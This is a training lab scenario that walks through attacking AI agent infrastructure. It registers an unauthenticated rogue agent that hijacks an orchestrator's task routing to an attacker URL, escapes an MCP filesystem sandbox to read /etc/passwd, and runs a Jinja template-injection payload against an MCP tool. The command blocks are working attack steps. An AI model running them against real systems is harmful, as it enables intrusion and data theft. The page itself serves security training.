# Scenario 17: Rogue Agents & MCP Privilege Escalation

> [All scenarios](index.md)

**Difficulty:** Advanced
**Time:** ~25 minutes
**Prerequisites:** [Scenario 11](scenario-11.md) (MCP tool infection)
**Target:** ailab-app:8104 (A2A orchestrator), ailab-dev:3002 (vulnerable MCP server)

## Background

Two escalation surfaces that show up in multi-agent and tool-integrated environments: an
orchestrator that lets anyone register a worker agent, and MCP tools whose implementations trust
their inputs.

## Objective

Inject a rogue agent into the orchestrator's routing, and escalate through the vulnerable MCP
server via a filesystem sandbox escape and a server-side template injection.

## Commands

```bash
# --- A2A rogue-agent injection ---
# The orchestrator's /agents/register is unauthenticated. Register an agent pointed at
# attacker infra, advertising a skill the orchestrator dispatches.
aipostex a2a --target http://172.16.50.40:8104 register \
  --agent-name pwn-agent --agent-url http://172.16.50.99:9000 --skill nl-to-sql --force-exploit

# Confirm it now wins routing for that skill (work is dispatched to attacker infra):
curl -s -X POST http://172.16.50.40:8104/a2a/workflow -d '{"skill":"nl-to-sql"}' | jq '.routed_to'

# --- MCP filesystem sandbox escape (CVE-2025-53109/53110 class) ---
aipostex mcp --target http://172.16.50.10:3002 sandbox-escape --force-exploit

# --- MCP server-side template injection ---
aipostex mcp --target http://172.16.50.10:3002 ssti --tool render_report --arg report_data --force-exploit
```

## Expected Finding

- **`a2a register`** → HIGH; the rogue agent is accepted and appears in the registry, and a task
  for its skill routes to the attacker URL (`impact` / `influenced`).
- **`mcp sandbox-escape`** → HIGH; the prefix-check bypass reads `/etc/passwd` from outside the
  advertised `/data/documents` sandbox (`impact` / `read-confirmed`).
- **`mcp ssti`** → HIGH; `render_report` evaluates `{{ lipsum.__globals__.keys() }}`, leaking the
  server's Python globals — a code-execution surface (`impact` / `read-confirmed`).

## Takeaways

- Unauthenticated registration turns a coordinator into an attacker's dispatch layer.
- Tool implementations, not the MCP protocol, own input validation — a prefix check before
  normalization and an unsandboxed template engine are both real, common mistakes.
